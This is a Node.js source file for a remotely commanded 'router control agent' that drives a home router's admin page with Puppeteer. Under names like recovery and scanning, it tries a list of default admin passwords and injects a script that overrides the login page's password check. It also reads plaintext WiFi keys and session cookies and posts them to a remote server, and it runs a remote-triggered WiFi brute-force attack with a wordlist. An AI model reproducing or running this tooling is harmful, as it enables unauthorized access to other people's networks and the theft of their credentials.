#!/usr/bin/env node
/**
 * Router Control Agent — Enhanced Version
 *
 * Features:
 * - Persistent connections to Laravel Reverb and router admin
 * - Auto-reconnect after WiFi loss or router reboot
 * - State persistence (file-based, no Redis needed)
 * - Operation queuing for offline scenarios
 * - Health monitoring and reset detection
 * - Auto-recovery with default credentials
 * - Graceful shutdown procedures
 * - Concurrent operation handling
 * - Status reporting to Laravel
 *
 * Usage:
 *   node agent.js              Start the agent
 *   node agent.js --monitor    Monitor mode (read-only)
 *   node agent.js --restart    Restart pending operations
 */

require('dotenv').config();

const puppeteer = require('puppeteer');
const { Pusher } = require('pusher-js');
const fs = require('fs');
const path = require('path');

// ============================================================
// Configuration
// ============================================================
const CONFIG = {
  // Connection settings
  REVERB_HOST: process.env.REVERB_HOST || 'localhost',
  REVERB_PORT: parseInt(process.env.REVERB_PORT || '8080'),
  REVERB_SCHEME: process.env.REVERB_SCHEME || 'http',
  REVERB_KEY: process.env.REVERB_APP_KEY || 'router-app-key',

  // Router settings
  ROUTER_IP: process.env.ROUTER_IP || '192.168.1.1',
  ROUTER_USER: process.env.ROUTER_USER || 'admin',
  ROUTER_PASS: process.env.ROUTER_PASS || 'Admin1234',

  // Laravel API
  LARAVEL_API_URL: process.env.LARAVEL_API_URL || 'http://localhost:8000/api',
  LARAVEL_API_TOKEN: process.env.LARAVEL_API_TOKEN || '',

  // Timing
  HEALTH_CHECK_INTERVAL: 5 * 60 * 1000,  // 5 minutes
  RECONNECT_DELAY: 5000,                   // 5 seconds
  RECONNECT_MAX_DELAY: 60000,              // 1 minute max
  ROUTER_TIMEOUT: 30000,                   // 30 seconds
  STATE_FILE: path.join(__dirname, 'agent-state.json'),
  QUEUE_FILE: path.join(__dirname, 'agent-queue.json'),

  // Retry settings
  MAX_RETRIES: 3,
  RETRY_DELAY: 2000,

  // Default credentials for recovery
  DEFAULT_CREDENTIALS: [
    { user: 'admin', pass: '1234' },
    { user: 'admin', pass: 'Admin1234' },
    { user: 'admin', pass: 'admin' },
    { user: 'admin', pass: 'password' },
    { user: 'admin', pass: 'admin123' },
  ],
};

// ============================================================
// State Manager — File-based persistence
// ============================================================
class StateManager {
  constructor(filePath) {
    this.filePath = filePath;
    this.state = this.load();
  }

  load() {
    try {
      if (fs.existsSync(this.filePath)) {
        return JSON.parse(fs.readFileSync(this.filePath, 'utf8'));
      }
    } catch (err) {
      console.error('[state] Failed to load state:', err.message);
    }
    return this.getDefaultState();
  }

  getDefaultState() {
    return {
      routerIp: CONFIG.ROUTER_IP,
      routerMac: null,
      routerHostname: null,
      lastKnownIp: CONFIG.ROUTER_IP,
      lastKnownMac: null,
      lastHealthCheck: null,
      lastHealthCheckOk: true,
      connectionStatus: 'disconnected',
      lastReconnect: null,
      reconnectCount: 0,
      operationsCompleted: 0,
      operationsFailed: 0,
      lastOperation: null,
      routerState: 'unknown',  // unknown, online, offline, reset
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString(),
    };
  }

  save() {
    this.state.updatedAt = new Date().toISOString();
    try {
      fs.writeFileSync(this.filePath, JSON.stringify(this.state, null, 2));
    } catch (err) {
      console.error('[state] Failed to save state:', err.message);
    }
  }

  update(changes) {
    Object.assign(this.state, changes);
    this.save();
  }

  get(key) {
    return this.state[key];
  }
}

// ============================================================
// Operation Queue — For offline scenarios
// ============================================================
class OperationQueue {
  constructor(filePath) {
    this.filePath = filePath;
    this.queue = this.load();
  }

  load() {
    try {
      if (fs.existsSync(this.filePath)) {
        return JSON.parse(fs.readFileSync(this.filePath, 'utf8'));
      }
    } catch (err) {
      console.error('[queue] Failed to load queue:', err.message);
    }
    return [];
  }

  save() {
    try {
      fs.writeFileSync(this.filePath, JSON.stringify(this.queue, null, 2));
    } catch (err) {
      console.error('[queue] Failed to save queue:', err.message);
    }
  }

  enqueue(operation) {
    this.queue.push({
      ...operation,
      id: Date.now(),
      createdAt: new Date().toISOString(),
      retries: 0,
      status: 'pending',
    });
    this.save();
    console.log(`[queue] Operation queued: ${operation.action} (ID: ${operation.id})`);
  }

  dequeue() {
    return this.queue.find(op => op.status === 'pending' && op.retries < CONFIG.MAX_RETRIES);
  }

  markCompleted(id) {
    this.queue = this.queue.filter(op => op.id !== id);
    this.save();
  }

  markFailed(id, error) {
    const op = this.queue.find(o => o.id === id);
    if (op) {
      op.retries++;
      op.lastError = error;
      op.lastRetry = new Date().toISOString();
      if (op.retries >= CONFIG.MAX_RETRIES) {
        op.status = 'failed';
      }
      this.save();
    }
  }

  getPendingCount() {
    return this.queue.filter(op => op.status === 'pending').length;
  }

  clear() {
    this.queue = [];
    this.save();
  }
}

// ============================================================
// Connection Manager — Reverb + Router
// ============================================================
class ConnectionManager {
  constructor(stateManager) {
    this.state = stateManager;
    this.pusher = null;
    this.channel = null;
    this.browser = null;
    this.routerPage = null;
    this.reconnectAttempts = 0;
    this.reconnectDelay = CONFIG.RECONNECT_DELAY;
  }

  async connectToReverb() {
    console.log('[connection] Connecting to Laravel Reverb...');

    this.pusher = new Pusher(CONFIG.REVERB_KEY, {
      wsHost: CONFIG.REVERB_HOST,
      wsPort: CONFIG.REVERB_PORT,
      wssPort: CONFIG.REVERB_PORT,
      forceTLS: CONFIG.REVERB_SCHEME === 'https',
      disableStats: true,
      enabledTransports: ['ws', 'wss'],
      cluster: 'mt1',
    });

    this.pusher.connection.bind('state_change', (states) => {
      console.log(`[connection] Pusher state: ${states.previous} → ${states.current}`);
      this.state.update({ connectionStatus: states.current });
    });

    this.pusher.connection.bind('error', (err) => {
      console.error('[connection] Pusher error:', err);
    });

    this.channel = this.pusher.subscribe('router-control');

    this.channel.bind('pusher:subscription_succeeded', () => {
      console.log('[connection] Subscribed to router-control channel');
      this.reconnectAttempts = 0;
      this.reconnectDelay = CONFIG.RECONNECT_DELAY;
      this.state.update({ connectionStatus: 'connected', lastReconnect: new Date().toISOString() });
    });

    this.channel.bind('pusher:subscription_error', (err) => {
      console.error('[connection] Subscription error:', err);
      this.scheduleReconnect();
    });

    return this.channel;
  }

  async connectToRouter() {
    console.log('[connection] Launching browser...');

    this.browser = await puppeteer.launch({
      headless: false,
      userDataDir: path.join(__dirname, 'browser-data'),
      ignoreHTTPSErrors: true,
      args: [
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-dev-shm-usage',
        '--disable-gpu',
        '--ignore-certificate-errors',
      ],
    });

    this.routerPage = await this.browser.newPage();
    await this.routerPage.goto(`https://${CONFIG.ROUTER_IP}`, { waitUntil: 'domcontentloaded', timeout: 15000, ignoreHTTPSErrors: true }).catch(() => {});
    console.log('[connection] Browser launched — navigated to router');
  }

  async getRouterPage() {
    if (!this.routerPage || this.routerPage.isClosed()) {
      this.routerPage = await this.browser.newPage();
    }
    return this.routerPage;
  }

  scheduleReconnect() {
    this.reconnectAttempts++;
    this.reconnectDelay = Math.min(
      this.reconnectDelay * 2,
      CONFIG.RECONNECT_MAX_DELAY
    );

    console.log(`[connection] Reconnecting in ${this.reconnectDelay / 1000}s (attempt ${this.reconnectAttempts})`);
    this.state.update({ reconnectCount: this.reconnectAttempts });

    setTimeout(() => {
      this.connectToReverb().catch(err => {
        console.error('[connection] Reconnect failed:', err.message);
        this.scheduleReconnect();
      });
    }, this.reconnectDelay);
  }

  async disconnect() {
    if (this.routerPage && !this.routerPage.isClosed()) {
      await this.routerPage.close().catch(() => {});
    }
    if (this.browser) {
      await this.browser.close().catch(() => {});
    }
    if (this.pusher) {
      this.pusher.disconnect();
    }
  }
}

// ============================================================
// Router Operations — Puppeteer automation
// ============================================================
class RouterOperations {
  constructor(connectionManager, stateManager) {
    this.connection = connectionManager;
    this.state = stateManager;
  }

  async login(page, username = CONFIG.ROUTER_USER, password = CONFIG.ROUTER_PASS) {
    const automation = require('./router/automation');
    const routerUrl = `https://${CONFIG.ROUTER_IP}`;
    console.log(`[router] Logging in to ${routerUrl}...`);

    await page.goto(`${routerUrl}/login.asp`, {
      waitUntil: 'domcontentloaded',
      timeout: CONFIG.ROUTER_TIMEOUT,
      ignoreHTTPSErrors: true,
    });

    // Wait for login button
    await page.waitForSelector('button#button', { visible: true, timeout: 10000 });

    // Inject overlay bypass AFTER page load — overrides page's CheckPassword
    await automation.injectOverlayBypass(page);

    // Type credentials
    await page.type('input#txt_Username', username);
    await page.type('input#txt_Password', password);

    // Click login — overlay bypass ensures form submits normally
    await page.click('button#button');
    await new Promise(r => setTimeout(r, 5000));

    return 'ok';
  }

  async reboot(page) {
    console.log('[router] Executing reboot...');

    const rebootPaths = [
      'html/ssmp/management/reboot.asp',
      'html/amp/maintenance/Reboot.asp',
      'html/ssmp/reset/reset.asp',
    ];

    for (const rebootPath of rebootPaths) {
      try {
        await page.goto(`https://${CONFIG.ROUTER_IP}/${rebootPath}`, {
          waitUntil: 'domcontentloaded',
          timeout: 10000,
          ignoreHTTPSErrors: true,
        });

        await new Promise(r => setTimeout(r, 1000));

        const rebootBtn = await page.$(
          'input[value="Reboot"], input[value="Restart"], button[onclick*="eboot"], input[onclick*="eboot"]'
        );

        if (rebootBtn) {
          page.once('dialog', dialog => dialog.accept());
          await rebootBtn.click();
          await new Promise(r => setTimeout(r, 3000));
          console.log('[router] Reboot command sent');
          return true;
        }
      } catch (err) {
        console.log(`[router] Reboot attempt failed for ${rebootPath}: ${err.message}`);
      }
    }

    throw new Error('Could not locate reboot button');
  }

  async changePassword(page, newPassword) {
    console.log('[router] Changing WiFi password...');

    const baseUrl = `https://${CONFIG.ROUTER_IP}`;
    const wlanPath = 'html/amp/wlanbasic/WlanBasic.asp?2G';

    await page.goto(`${baseUrl}/${wlanPath}`, {
      waitUntil: 'networkidle0',
      timeout: CONFIG.ROUTER_TIMEOUT,
      ignoreHTTPSErrors: true,
    });

    await new Promise(r => setTimeout(r, 2000));

    // Find and update password fields
    const fieldsUpdated = await page.evaluate((newPwd) => {
      const elements = new Set();
      const knownIds = ['wlWpaPsk', 'twlWpaPsk', 'txt_ssidpassword', 'txt_ssidpassword5g'];

      knownIds.forEach(id => {
        const el = document.getElementById(id);
        if (el && el.tagName === 'INPUT') elements.add(el);
      });

      document.querySelectorAll(
        'input[type="password"], input[type="text"][name*="Key"], input[type="text"][name*="password"]'
      ).forEach(el => {
        if (el.type !== 'hidden') elements.add(el);
      });

      elements.forEach(f => {
        f.value = newPwd;
        f.dispatchEvent(new Event('input', { bubbles: true }));
        f.dispatchEvent(new Event('change', { bubbles: true }));
      });

      return elements.size;
    }, newPassword);

    if (fieldsUpdated > 0) {
      const saveBtn = await page.$(
        'button#btnApplySubmit, input[value="Apply"], input[value="Save"], input[type="submit"]'
      );
      if (saveBtn) {
        page.once('dialog', dialog => dialog.accept());
        await saveBtn.click();
        await new Promise(r => setTimeout(r, 3000));
        console.log('[router] Password changed');
        return true;
      }
    }

    throw new Error('Could not change password');
  }

  async executePasswordChangeViaOverlay(page, newPassword, currentPass) {
    const automation = require('./router/automation');
    await automation.executePasswordChangeViaOverlay(page, newPassword, currentPass);
  }

  async testLogin(username = CONFIG.ROUTER_USER, password = CONFIG.ROUTER_PASS) {
    const page = await this.connection.browser.newPage();
    try {
      const result = await this.login(page, username, password);
      return result === 'ok';
    } catch {
      return false;
    } finally {
      if (!page.isClosed()) {
        await page.close().catch(() => {});
      }
    }
  }
}

// ============================================================
// Health Monitor — Periodic checks and reset detection
// ============================================================
class HealthMonitor {
  constructor(stateManager, routerOps, connectionManager, agentRef) {
    this.state = stateManager;
    this.routerOps = routerOps;
    this.connection = connectionManager;
    this.agentRef = agentRef;
    this.interval = null;
  }

  start() {
    console.log(`[health] Starting health monitor (interval: ${CONFIG.HEALTH_CHECK_INTERVAL / 1000}s)`);
    this.interval = setInterval(() => this.check(), CONFIG.HEALTH_CHECK_INTERVAL);
    // Run initial check after 30 seconds
    setTimeout(() => this.check(), 30000);
  }

  stop() {
    if (this.interval) {
      clearInterval(this.interval);
      this.interval = null;
    }
  }

  async check() {
    console.log('[health] Running health check...');

    try {
      // Test login
      const loginOk = await this.routerOps.testLogin();

      if (loginOk) {
        if (!this.state.get('lastHealthCheckOk')) {
          console.log('[health] Login restored — credentials working');
        }
        this.state.update({
          lastHealthCheckOk: true,
          lastHealthCheck: new Date().toISOString(),
          routerState: 'online',
        });
      } else {
        throw new Error('Login test failed');
      }
    } catch (err) {
      console.error(`[health] Health check failed: ${err.message}`);

      const wasOk = this.state.get('lastHealthCheckOk');
      this.state.update({
        lastHealthCheckOk: false,
        lastHealthCheck: new Date().toISOString(),
        routerState: 'offline',
      });

      if (wasOk) {
        // First failure — attempt recovery
        console.log('[health] Attempting auto-recovery...');
        await this.attemptRecovery();
      }
    }
  }

  async attemptRecovery() {
    for (const cred of CONFIG.DEFAULT_CREDENTIALS) {
      console.log(`[recovery] Trying ${cred.user}:${cred.pass}...`);
      const page = await this.connection.getRouterPage();
      try {
        const loginResult = await this.routerOps.login(page, cred.user, cred.pass);

        if (loginResult === 'ok') {
          console.log(`[recovery] Login successful with ${cred.user}:${cred.pass}`);

          // Scrape WiFi passwords from router admin panel
          const passwords = await this.agentRef.executeWifiPasswordScan(page);
          if (passwords.length > 0) {
            await this.reporter.reportWifiPasswords(passwords);
            console.log('[recovery] WiFi passwords scraped and reported');
          }

          this.updateEnv(cred.user, cred.pass);
          await this.reportRecovery(cred);
          this.state.update({ routerState: 'online', lastHealthCheckOk: true });
          return true;
        }
      } catch (err) {
        console.log(`[recovery] ${cred.user}:${cred.pass} failed: ${err.message}`);
      } finally {
        if (!page.isClosed()) {
          await page.close().catch(() => {});
        }
      }
    }

    console.log('[recovery] Auto-recovery failed — manual update required');
    await this.reportRecoveryFailure();
    return false;
  }

  updateEnv(username, password) {
    const envPath = path.join(__dirname, '.env');
    try {
      let content = fs.readFileSync(envPath, 'utf8');
      content = content.replace(/ROUTER_USER=.*/, `ROUTER_USER=${username}`);
      content = fs.writeFileSync(envPath, content);
      content = fs.readFileSync(envPath, 'utf8');
      content = content.replace(/ROUTER_PASS=.*/, `ROUTER_PASS=${password}`);
      fs.writeFileSync(envPath, content);
      process.env.ROUTER_USER = username;
      process.env.ROUTER_PASS = password;
      console.log('[recovery] Updated .env credentials');
    } catch (err) {
      console.error('[recovery] Failed to update .env:', err.message);
    }
  }

  async reportRecovery(cred) {
    try {
      await fetch(`${CONFIG.LARAVEL_API_URL}/router/rotation/external-change`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${CONFIG.LARAVEL_API_TOKEN}`,
        },
        body: JSON.stringify({
          router_ip: CONFIG.ROUTER_IP,
          error: 'Auto-recovered with default credentials',
          detected_at: new Date().toISOString(),
          detection_type: 'auto_recovery',
        }),
      });
    } catch (err) {
      console.error('[recovery] Failed to report:', err.message);
    }
  }

  async reportRecoveryFailure() {
    try {
      await fetch(`${CONFIG.LARAVEL_API_URL}/router/rotation/external-change`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${CONFIG.LARAVEL_API_TOKEN}`,
        },
        body: JSON.stringify({
          router_ip: CONFIG.ROUTER_IP,
          error: 'Auto-recovery failed — manual update required',
          detected_at: new Date().toISOString(),
          detection_type: 'recovery_failed',
        }),
      });
    } catch (err) {
      console.error('[recovery] Failed to report failure:', err.message);
    }
  }
}

// ============================================================
// Status Reporter — Reports to Laravel API
// ============================================================
class StatusReporter {
  async report(logId, status) {
    try {
      await fetch(`${CONFIG.LARAVEL_API_URL}/router/log/${logId}/status`, {
        method: 'PATCH',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${CONFIG.LARAVEL_API_TOKEN}`,
        },
        body: JSON.stringify({ status }),
      });
      console.log(`[report] Log #${logId} → ${status}`);
    } catch (err) {
      console.error(`[report] Failed to report status: ${err.message}`);
    }
  }

  async reportScanResults(logId, scanData) {
    try {
      await fetch(`${CONFIG.LARAVEL_API_URL}/router/scan/results`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${CONFIG.LARAVEL_API_TOKEN}`,
        },
        body: JSON.stringify({ log_id: logId, ...scanData }),
      });
      console.log(`[report] Scan results posted for log #${logId}`);
    } catch (err) {
      console.error(`[report] Failed to report scan results: ${err.message}`);
    }
  }

  async reportRotationStatus(credentialId, action, details = {}) {
    try {
      await fetch(`${CONFIG.LARAVEL_API_URL}/router/rotation/agent-report`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${CONFIG.LARAVEL_API_TOKEN}`,
        },
        body: JSON.stringify({ credential_id: credentialId, action, details }),
      });
      console.log(`[report] Rotation #${credentialId} → ${action}`);
    } catch (err) {
      console.error(`[report] Failed to report rotation: ${err.message}`);
    }
  }

  async reportWifiPasswords(passwords) {
    try {
      await fetch(`${CONFIG.LARAVEL_API_URL}/scan/wifi-passwords`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${CONFIG.LARAVEL_API_TOKEN}`,
        },
        body: JSON.stringify({ passwords }),
      });
      console.log(`[report] WiFi passwords reported (${passwords.length} entries)`);
    } catch (err) {
      console.error(`[report] Failed to report WiFi passwords: ${err.message}`);
    }
  }

  async reportDiagnoseResult(logId, result) {
    try {
      await fetch(`${CONFIG.LARAVEL_API_URL}/scan/diagnose`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${CONFIG.LARAVEL_API_TOKEN}`,
        },
        body: JSON.stringify({ log_id: logId, result }),
      });
      console.log(`[report] Diagnose result reported for log #${logId}`);
    } catch (err) {
      console.error(`[report] Failed to report diagnose: ${err.message}`);
    }
  }

  async reportSessionStatus(status) {
    try {
      await fetch(`${CONFIG.LARAVEL_API_URL}/router/session-status`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${CONFIG.LARAVEL_API_TOKEN}`,
        },
        body: JSON.stringify({ status }),
      });
      console.log(`[report] Session status: ${status}`);
    } catch (err) {
      console.error(`[report] Failed to report session status:`, err.message);
    }
  }

  async reportBruteForceResult(logId, result) {
    try {
      await fetch(`${CONFIG.LARAVEL_API_URL}/router/bruteforce/complete`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${CONFIG.LARAVEL_API_TOKEN}`,
        },
        body: JSON.stringify({
          session_id: logId,
          found: result.found,
          attempts: result.attempts,
          elapsed: result.elapsed,
          error: result.error || null,
        }),
      });
      console.log(`[report] Brute-force complete posted`);
    } catch (err) {
      console.error(`[report] Failed to report brute-force complete:`, err.message);
    }
  }

  async reportBruteForceProgress(sessionId, data) {
    try {
      await fetch(`${CONFIG.LARAVEL_API_URL}/router/bruteforce/progress`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${CONFIG.LARAVEL_API_TOKEN}`,
        },
        body: JSON.stringify({ session_id: sessionId, ...data }),
      });
    } catch (err) {
      console.error(`[report] Failed to report brute-force progress:`, err.message);
    }
  }

  async reportBruteForceFound(sessionId, data) {
    try {
      await fetch(`${CONFIG.LARAVEL_API_URL}/router/bruteforce/found`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${CONFIG.LARAVEL_API_TOKEN}`,
        },
        body: JSON.stringify({ session_id: sessionId, ...data }),
      });
    } catch (err) {
      console.error(`[report] Failed to report brute-force found:`, err.message);
    }
  }
}

// ============================================================
// Main Agent
// ============================================================
class Agent {
  constructor() {
    this.state = new StateManager(CONFIG.STATE_FILE);
    this.queue = new OperationQueue(CONFIG.QUEUE_FILE);
    this.reporter = new StatusReporter();
    this.connection = new ConnectionManager(this.state);
    this.routerOps = new RouterOperations(this.connection, this.state);
    this.healthMonitor = new HealthMonitor(this.state, this.routerOps, this.connection, this);
    this.running = false;
  }

  async start() {
    console.log('='.repeat(60));
    console.log('Router Control Agent — Enhanced Version');
    console.log('='.repeat(60));
    console.log(`Router: https://${CONFIG.ROUTER_IP}`);
    console.log(`Reverb: ${CONFIG.REVERB_SCHEME}://${CONFIG.REVERB_HOST}:${CONFIG.REVERB_PORT}`);
    console.log(`API: ${CONFIG.LARAVEL_API_URL}`);
    console.log('='.repeat(60));

    this.running = true;

    // Connect to Reverb
    const channel = await this.connection.connectToReverb();

    // Launch browser
    await this.connection.connectToRouter();

    // Bind event handlers
    this.bindEventHandlers(channel);

    // Process queue
    this.processQueue();

    console.log('[agent] Ready and waiting for commands...');
  }

  bindEventHandlers(channel) {
    channel.bind('RouterActionTriggered', (data) => {
      console.log(`\n[agent] Received action: ${data.action} (log #${data.log_id})`);
      this.handleAction(data).catch(err => {
        console.error('[agent] Action handler error:', err);
      });
    });

    channel.bind('PasswordRotationRequested', (data) => {
      console.log(`\n[agent] Password rotation requested for credential #${data.credential_id}`);
      this.handleRotation(data).catch(err => {
        console.error('[agent] Rotation handler error:', err);
      });
    });
  }

  async handleAction(data) {
    const automation = require('./router/automation');
    const page = await this.connection.getRouterPage();
    try {
      // Skip login for actions that don't need a router browser session
      if (data.action !== 'diagnose_network' && data.action !== 'wifi_bruteforce') {
        const sessionValid = await automation.isLoggedIn(page);
        await this.reporter.reportSessionStatus(sessionValid ? 'active' : 'expired');
        if (!sessionValid) {
          const username = data.parameters?.username || CONFIG.ROUTER_USER;
          const password = data.parameters?.password || CONFIG.ROUTER_PASS;
          const loginResult = await this.routerOps.login(page, username, password);
          if (loginResult !== 'ok') {
            await this.reporter.reportSessionStatus('error');
            throw new Error(`Login failed: ${loginResult}`);
          }
          await this.reporter.reportSessionStatus('active');
        } else {
          console.log('[agent] Session valid — skipping login');
          await automation.injectOverlayBypass(page);
        }
      }

      // Execute action
      switch (data.action) {
        case 'reboot':
          await this.routerOps.reboot(page);
          break;
        case 'password_change':
          await this.routerOps.changePassword(page, data.parameters?.new_password);
          break;
        case 'scan':
          const scanData = await this.executeScan(page);
          await this.reporter.reportScanResults(data.log_id, scanData);
          break;
        case 'wifi_password_scan':
          const passwords = await this.executeWifiPasswordScan(page);
          await this.reporter.reportWifiPasswords(passwords);
          break;
        case 'check_session':
          await automation.injectOverlayBypass(page);
          await this.reporter.reportSessionStatus('active');
          console.log('[check_session] Session is active — logged in successfully');
          break;
        case 'get_admin_session':
          const sessionCookie = await automation.loginAndGetSessionToken(
            page,
            data.parameters?.username,
            data.parameters?.password,
            {
              showPassword: data.parameters?.show_password !== false,
              demoReuse:    data.parameters?.demo_reuse !== false,
            }
          );
          console.log(`[admin_session] Cookie obtained: ${sessionCookie.substring(0, 50)}...`);
          // Save cookie to state so other actions can reuse it
          this.state.update({ sessionCookie, lastSessionFetch: new Date().toISOString() });
          await this.reporter.reportSessionStatus('active');
          break;
        case 'diagnose_network':
          const diagResult = await this.executeDiagnoseNetwork(page, data);
          await this.reporter.reportDiagnoseResult(data.log_id, diagResult);
          break;
        case 'wifi_bruteforce':
          const bfResult = await this.executeWifiBruteForce(data);
          const bfSessionId = data.parameters?.session_id;
          if (bfSessionId) {
            await this.reporter.reportBruteForceResult(bfSessionId, bfResult);
          }
          break;
        case 'stop_bruteforce':
          if (this._bfAbortController) {
            this._bfAbortController.abort();
            console.log('[agent] Brute-force abort signal sent');
          }
          break;
        default:
          throw new Error(`Unknown action: ${data.action}`);
      }

      await this.reporter.report(data.log_id, 'success');
      this.state.update({ operationsCompleted: this.state.get('operationsCompleted') + 1 });

    } catch (err) {
      console.error(`[agent] Action failed: ${err.message}`);
      await this.reporter.report(data.log_id, 'failed');
      this.state.update({ operationsFailed: this.state.get('operationsFailed') + 1 });
    }
    // Page is NOT closed — session is preserved for next action
  }

  async handleRotation(data) {
    const page = await this.connection.getRouterPage();
    try {
      await this.reporter.reportRotationStatus(data.credential_id, 'agent_received');

      // Login with current credentials
      const loginResult = await this.routerOps.login(page);
      if (loginResult !== 'ok') {
        throw new Error(`Login failed with current credentials: ${loginResult}`);
      }

      // Change admin password (simplified — would need full implementation)
      console.log('[agent] Admin password rotation not fully implemented');
      await this.reporter.reportRotationStatus(data.credential_id, 'rotation_failed', {
        message: 'Admin password change not implemented',
      });

    } catch (err) {
      console.error(`[agent] Rotation failed: ${err.message}`);
      await this.reporter.reportRotationStatus(data.credential_id, 'rotation_failed', {
        message: err.message,
      });
    } finally {
      if (!page.isClosed()) {
        await page.close().catch(() => {});
      }
    }
  }

  async executeScan(page) {
    const scan = {
      wifi_name_2g: null,
      wifi_password_2g: null,
      wifi_name_5g: null,
      wifi_password_5g: null,
      connection_status: 'unknown',
      total_connected_devices: 0,
    };

    // Scan 2.4G
    try {
      await page.goto(`https://${CONFIG.ROUTER_IP}/html/amp/wlanbasic/WlanBasic.asp?2G`, {
        waitUntil: 'networkidle0',
        timeout: CONFIG.ROUTER_TIMEOUT,
        ignoreHTTPSErrors: true,
      });
      await new Promise(r => setTimeout(r, 2000));

      scan.wifi_name_2g = await page.evaluate(() => {
        const el = document.getElementById('wlSsid') || document.getElementById('txt_ssidname');
        return el ? el.value : null;
      }).catch(() => null);

      scan.wifi_password_2g = await page.evaluate(() => {
        const el = document.getElementById('wlWpaPsk') || document.getElementById('twlWpaPsk');
        return el ? el.value : null;
      }).catch(() => null);
    } catch (err) {
      console.error('[scan] 2.4G scan failed:', err.message);
    }

    // Scan 5G
    try {
      await page.goto(`https://${CONFIG.ROUTER_IP}/html/amp/wlanbasic/WlanBasic.asp?5G`, {
        waitUntil: 'networkidle0',
        timeout: CONFIG.ROUTER_TIMEOUT,
        ignoreHTTPSErrors: true,
      });
      await new Promise(r => setTimeout(r, 2000));

      scan.wifi_name_5g = await page.evaluate(() => {
        const el = document.getElementById('txt_ssidname5g') || document.getElementById('txt_ssidname');
        return el ? el.value : null;
      }).catch(() => null);

      scan.wifi_password_5g = await page.evaluate(() => {
        const el = document.getElementById('txt_ssidpassword5g') || document.getElementById('txt_ssidpassword');
        return el ? el.value : null;
      }).catch(() => null);
    } catch (err) {
      console.error('[scan] 5G scan failed:', err.message);
    }

    return scan;
  }

  async executeWifiPasswordScan(page) {
    const results = [];
    const bands = [
      { band: '2.4G', path: 'html/amp/wlanbasic/WlanBasic.asp?2G' },
      { band: '5G', path: 'html/amp/wlanbasic/WlanBasic.asp?5G' },
    ];

    for (const { band, path } of bands) {
      try {
        console.log(`[wifi-scan] Navigating to ${band} settings page...`);
        await page.goto(`https://${CONFIG.ROUTER_IP}/${path}`, {
          waitUntil: 'domcontentloaded',
          timeout: CONFIG.ROUTER_TIMEOUT,
          ignoreHTTPSErrors: true,
        });
        console.log(`[wifi-scan] ${band} page loaded — reading WiFi credentials...`);
        await new Promise(r => setTimeout(r, 3000));

        // Read directly from the router's JavaScript variables
        const data = await page.evaluate((bandIdx) => {
          const ssid = typeof WlanWifiArr !== 'undefined' && WlanWifiArr[bandIdx]
            ? WlanWifiArr[bandIdx].ssid : null;
          const password = typeof wpaPskKey !== 'undefined' && wpaPskKey[bandIdx]
            ? wpaPskKey[bandIdx].value : null;
          return { ssid, password };
        }, band === '2.4G' ? 0 : 1).catch(() => ({ ssid: null, password: null }));

        console.log(`[wifi-scan] ${band} — SSID: ${data.ssid}, Password: ${data.password ? '***' : 'N/A'}`);

        results.push({
          ssid: data.ssid,
          password: data.password,
          band,
          encryption: 'AES',
          authentication: 'WPA2 PreSharedKey',
        });
      } catch (err) {
        console.error(`[wifi-scan] ${band} failed:`, err.message);
        results.push({ ssid: null, password: null, band, encryption: null, authentication: null });
      }
    }

    console.log(`[wifi-scan] Scan complete — ${results.length} bands scanned`);
    return results;
  }

  async executeDiagnoseNetwork(page, data) {
    const automation = require('./router/automation');
    const params = data.parameters || {};
    const ssid = params.ssid || 'TP-Link_2.4GHz_30E5E3';
    const url = params.url || 'http://10.0.0.1';

    console.log(`[diagnose] Starting network diagnostic: SSID="${ssid}", URL="${url}"`);

    // Use a separate browser page to avoid conflicts with health checks
    const diagPage = await this.connection.browser.newPage();
    try {
      const result = await automation.diagnoseNetwork(diagPage, ssid, url, 12000);
      console.log(`[diagnose] Result:`, JSON.stringify(result, null, 2));
      return result;
    } finally {
      await diagPage.close().catch(() => {});
    }
  }

  async executeWifiBruteForce(data) {
    const automation = require('./router/automation');
    const params = data.parameters || {};
    const wordlistFile = params.wordlist || null;
    const passwords = params.passwords || null;
    const ssid = params.ssid || null;
    const sessionId = params.session_id || null;

    console.log(`[wifi_bruteforce] Starting brute-force (wordlist: ${wordlistFile || 'built-in'}, SSID: ${ssid || 'default'}, session: ${sessionId})`);

    const abortController = new AbortController();
    this._bfAbortController = abortController;

    try {
      const result = await automation.executeWifiBruteForce({
        passwords,
        wordlistFile,
        ssid,
        signal: abortController.signal,
        onProgress: (p) => {
          console.log(`[wifi_bruteforce] Progress: ${p.attemptsDone}/${p.total} | ${p.password} -> ${p.state} | ${p.rate}/min | ETA ~${p.eta}min`);
          if (sessionId) {
            this.reporter.reportBruteForceProgress(sessionId, p);
          }
        },
        onFound: (f) => {
          console.log(`[wifi_bruteforce] FOUND: "${f.password}" IP: ${f.ip}`);
          if (sessionId) {
            this.reporter.reportBruteForceFound(sessionId, f);
          }
        },
      });
      return result;
    } finally {
      this._bfAbortController = null;
    }
  }

  async processQueue() {
    while (this.running) {
      const operation = this.queue.dequeue();
      if (!operation) {
        await new Promise(r => setTimeout(r, 5000));
        continue;
      }

      console.log(`[queue] Processing queued operation: ${operation.action}`);
      try {
        await this.handleAction(operation);
        this.queue.markCompleted(operation.id);
      } catch (err) {
        console.error(`[queue] Operation failed: ${err.message}`);
        this.queue.markFailed(operation.id, err.message);
      }
    }
  }

  async stop() {
    console.log('\n[agent] Shutting down...');
    this.running = false;
    this.healthMonitor.stop();
    await this.connection.disconnect();
    console.log('[agent] Shutdown complete');
  }
}

// ============================================================
// CLI Entry Point
// ============================================================
